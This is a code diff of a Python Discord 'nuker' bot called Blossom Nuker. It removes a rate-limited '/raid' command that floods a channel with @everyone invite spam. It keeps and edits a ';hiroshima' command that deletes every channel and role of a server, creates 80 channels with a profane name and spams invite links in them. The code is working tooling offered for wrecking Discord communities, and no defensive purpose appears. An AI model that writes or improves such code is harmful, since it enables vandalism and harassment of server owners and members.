@@ -19,9 +19,9 @@ if not TOKEN:
     exit(1)
 
 # ============================================================
-#  INTENTS
+#  INTENTS — FIXED (this is why commands weren't working)
 # ============================================================
-intents = discord.Intents.all()
+intents = discord.Intents.all()  # Enable ALL intents for maximum compatibility
 intents.message_content = True
 intents.members = True
 intents.guilds = True
@@ -171,96 +171,6 @@ async def send_invite_spam(channels, amount=30):
     return total_sent
 
 # ============================================================
-#  RAID SLASH COMMAND — CHANNEL-ONLY SPAM
-# ============================================================
-class RaidRateLimiter:
-    def __init__(self, max_requests_per_second=20):
-        self.max_requests = max_requests_per_second
-        self.timestamps = deque(maxlen=max_requests_per_second * 2)
-        self.lock = asyncio.Lock()
-    
-    async def wait_if_needed(self):
-        async with self.lock:
-            now = time.time()
-            while self.timestamps and now - self.timestamps[0] > 1.0:
-                self.timestamps.popleft()
-            
-            if len(self.timestamps) >= self.max_requests:
-                oldest = self.timestamps[0]
-                wait_time = 1.0 - (now - oldest) + 0.05
-                if wait_time > 0:
-                    await asyncio.sleep(wait_time)
-            
-            self.timestamps.append(time.time())
-
-raid_limiter = RaidRateLimiter(max_requests_per_second=20)
-
-async def raid_spam_channel(channel, message, amount=50):
-    """Spam a single channel with the invite link."""
-    if not channel.permissions_for(channel.guild.me).send_messages:
-        return 0
-    
-    sent = 0
-    batch_size = 5
-    
-    for i in range(0, min(amount, 150), batch_size):
-        batch_count = min(batch_size, amount - i)
-        tasks = []
-        
-        for _ in range(batch_count):
-            tasks.append(asyncio.create_task(channel.send(message)))
-        
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        for r in results:
-            if isinstance(r, discord.Message):
-                sent += 1
-            elif isinstance(r, discord.errors.HTTPException) and r.status == 429:
-                retry_after = float(r.response.headers.get('Retry-After', 1))
-                await asyncio.sleep(retry_after + 0.3)
-                try:
-                    await channel.send(message)
-                    sent += 1
-                except:
-                    pass
-        
-        await asyncio.sleep(0.05)
-    
-    return sent
-
-@client.tree.command(name="raid", description="Spam the Blossom invite link in this channel (fast!)")
-async def raid(interaction: discord.Interaction):
-    """Slash command to spam the invite link in the current channel only."""
-    
-    await interaction.response.defer(ephemeral=False)
-    
-    if not interaction.guild:
-        await interaction.followup.send("❌ This command only works in a server.", ephemeral=True)
-        return
-    
-    # Check if the bot can send messages in this channel
-    if not interaction.channel.permissions_for(interaction.guild.me).send_messages:
-        await interaction.followup.send("❌ I don't have permission to send messages in this channel.", ephemeral=True)
-        return
-    
-    # The invite message
-    invite_message = "@everyone **JOIN BLOSSOM EMPIRE** — discord.gg/Gx9b3AsJR3"
-    
-    # Send starting message
-    await interaction.followup.send(f"💥 **RAID STARTED** — Spamming this channel...")
-    
-    # Spam the channel
-    sent = await raid_spam_channel(interaction.channel, invite_message, amount=50)
-    
-    # Send completion message
-    await interaction.followup.send(
-        f"✅ **RAID COMPLETE** — Sent {sent} invite messages in this channel!\n"
-        f"🔥 Join the chaos: discord.gg/Gx9b3AsJR3"
-    )
-    
-    print(f"[RAID] {interaction.user} raided #{interaction.channel.name} in {interaction.guild.name} — {sent} messages sent")
-
-# ============================================================
 #  BOT EVENTS
 # ============================================================
 @client.event
@@ -277,15 +187,7 @@ async def on_ready():
     print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")
     print(f"{Fore.GREEN}[+] Bot is ready! Logged in as {client.user}")
     print(f"{Fore.GREEN}[+] Guilds: {len(client.guilds)}")
-    
-    # Sync slash commands
-    try:
-        synced = await client.tree.sync()
-        print(f"{Fore.GREEN}[+] Synced {len(synced)} slash commands.")
-        for cmd in synced:
-            print(f"    /{cmd.name} — {cmd.description}")
-    except Exception as e:
-        print(f"{Fore.RED}[ERROR] Failed to sync slash commands: {e}")
+    print(f"{Fore.GREEN}[+] Commands loaded: {len(client.commands)}")
 
 @client.before_invoke
 async def before_invoke(ctx):
@@ -303,6 +205,7 @@ async def hiroshima(ctx):
         await ctx.send("This command only works in a server.")
         return
     
+    # Check if bot has admin permissions
     if not ctx.guild.me.guild_permissions.administrator:
         await ctx.send("❌ I need Administrator permissions to nuke!")
         return
@@ -347,7 +250,7 @@ async def hiroshima(ctx):
     except Exception as e:
         print(f"[ERROR] Report: {e}")
 
-    # --- DELETE CHANNELS ---
+    # --- DELETE CHANNELS (FAST) ---
     print("[DELETE] Deleting all channels...")
     delete_tasks = []
     for channel in list(guild.channels):
@@ -357,7 +260,7 @@ async def hiroshima(ctx):
         await asyncio.gather(*delete_tasks, return_exceptions=True)
         print(f"[DELETE] Deleted {len(delete_tasks)} channels")
 
-    # --- DELETE ROLES ---
+    # --- DELETE ROLES (FAST) ---
     print("[DELETE] Deleting all roles...")
     delete_tasks = []
     for role in list(guild.roles):
@@ -368,11 +271,11 @@ async def hiroshima(ctx):
         await asyncio.gather(*delete_tasks, return_exceptions=True)
         print(f"[DELETE] Deleted {len(delete_tasks)} roles")
 
-    # --- CREATE CHANNELS ---
+    # --- CREATE CHANNELS (ULTRA FAST) ---
     print("[CREATE] Creating 80 channels at max speed...")
     channels = await create_channels_fast(guild, count=80, name="Fucked By blossom.")
 
-    # --- SPAM ---
+    # --- SPAM (ULTRA FAST) ---
     if channels:
         print(f"[SPAM] Spamming {len(channels)} channels...")
         await send_invite_spam(channels, amount=40)
@@ -476,7 +379,6 @@ async def help_command(ctx):
     embed.add_field(name=";credits", value="Show bot credits", inline=False)
     embed.add_field(name=";getbot", value="Get the invite link for this bot", inline=False)
     embed.add_field(name=";whitelist", value="Whitelist a server (owner only)", inline=False)
-    embed.add_field(name="/raid", value="Slash command — spam invite in THIS channel only", inline=False)
     embed.set_footer(text="Blossom Nuker — chaos engine")
     await ctx.send(embed=embed)
 
